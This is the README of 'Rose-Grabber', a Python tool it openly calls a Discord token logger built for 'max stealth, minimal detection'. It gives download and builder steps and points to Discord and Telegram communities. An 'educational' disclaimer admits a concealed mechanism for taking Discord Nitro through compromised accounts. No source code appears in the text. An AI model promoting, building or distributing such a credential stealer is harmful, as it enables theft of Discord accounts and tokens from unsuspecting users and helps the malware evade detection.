<h1 id="top" align="center">
  <br>
  <a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rosebb.png" alt="R"></a>
  <br>
</h1>

<div align="center" style="background-color: #da467d; padding: 20px;">
    <a href="https://discord.gg/sbt9drkvAA">
        <img src="https://img.shields.io/badge/Discord-%238B0000.svg?style=for-the-badge&logo=discord&logoColor=white" alt="Join our Discord">
    </a>
    <a href="https://t.me/rosegrabber">
        <img src="https://img.shields.io/badge/Telegram-%238B0000.svg?style=for-the-badge&logo=telegram&logoColor=white" alt="Join our Telegram">
    </a>
    <br>
    <a href="https://deepsource.io/gh/DamagingRose/Rose-Grabber/?ref=repository-badge}" target="_blank">
        <img alt="DeepSource" title="DeepSource" src="https://deepsource.io/gh/DamagingRose/Rose-Grabber.svg/?label=active+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/>
    </a>
    <a href="https://www.codefactor.io/repository/github/damagingrose/rose-grabber">
        <img src="https://www.codefactor.io/repository/github/damagingrose/rose-grabber/badge" alt="CodeFactor" />
    </a>
    <a href="https://deepsource.io/gh/DamagingRose/Rose-Grabber/?ref=repository-badge}" target="_blank">
        <img alt="DeepSource" title="DeepSource" src="https://deepsource.io/gh/DamagingRose/Rose-Grabber.svg/?label=resolved+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/>
    </a>
    <br>
    <img src="https://img.shields.io/github/languages/top/DamagingRose/Rose-Grabber?color=%238B0000&style=flat-square">
    <img src="https://img.shields.io/github/stars/DamagingRose/Rose-Grabber?color=%238B0000&logoColor=%238B0000&style=flat-square">
    <br>
    <img src="https://img.shields.io/github/commit-activity/w/DamagingRose/Rose-Grabber?color=%238B0000&style=flat-square"> 
    <img src="https://img.shields.io/github/last-commit/DamagingRose/Rose-Grabber?color=%238B0000&logoColor=%238B0000&style=flat-square">
    <br>
    <img src="https://img.shields.io/github/issues/DamagingRose/Rose-Grabber?color=%238B0000&logoColor=%238B0000&style=flat-square">
    <img src="https://img.shields.io/github/issues-closed/DamagingRose/Rose-Grabber?color=%238B0000&logoColor=%23da467d&style=flat-square">
    <br>
</div>

<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">

<div align="center">
    <h1>
       Python-Powered Discord Token Logger: Max Stealth, Minimal Detection, and a Gorgeous UI Builder!
    </h1>

</div>

## Features

A list of features can be found in our [documentation](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs/FEATURES.md).

## Disclaimer

This tool is explicitly designed and provided exclusively for educational intentions. Its primary objective is to illuminate the vulnerabilities that files can be susceptible to, highlighting the need for proactive security measures. It is imperative that this tool is never leveraged for any illegal, unauthorized, or malicious undertakings. Under no circumstances will I assume liability for any detrimental consequences inflicted upon your computing infrastructure. I hereby absolve myself from any complicity in activities of an illicit nature. Emphatically, this tool's utility is confined to didactic objectives.

Please be cognizant of the fact that nestled within the intricate architecture of this tool is an elaborate mechanism with latent potential, which, if wielded in an iniquitous manner, could conceivably lead to the illicit acquisition of Discord Nitro privileges through the exploitation of compromised accounts. Nevertheless, I vehemently discourage any endeavor to explore or exploit this covert facet for personal enrichment or unscrupulous exploits. The primary rationale behind divulging this concealed facet is to underscore the paramount importance of fortifying personal data security and adhering to the ethical deployment of technological instruments.

## Setup

- Download repository [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
- Extract packed contents. You can find a guide [here](https://www.top-password.com/knowledge/extract-files-from-zip-in-windows-10.html).
- Launch UI by executing [`builder.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/builder.bat).

## Preview

If you're still unsure you may check out the preview file in our [documentation](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs/PREVIEW.md).

## Changelog

The changelog history can be found in our [documentation](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs/CHANGELOG.md).

## Credits

**We extend our deepest appreciation to these exceptional contributors. Their expertise and dedication have greatly enhanced this project.**

- [xpierroz](https://github.com/xpierroz)
- [killer](https://github.com/Minecraftkillir)
- [Smug246](https://github.com/Smug246)
- [addi00000](https://github.com/addi00000)
- [Rdimo](https://github.com/Rdimo)
- [loTus04](https://github.com/loTus04)
- [suvan1911](https://github.com/suvan1911)
- [suegdu](https://github.com/suegdu)
- [blank](https://github.com/blank-c)
- [something-0001](https://github.com/something-0001)

**Thank you all!**

## Love to everyone 💞
[![Stargazers repo roster for @DamagingRose/Rose-Grabber](https://reporoster.com/stars/dark/DamagingRose/Rose-Grabber)](https://github.com/DamagingRose/Rose-Grabber/stargazers)
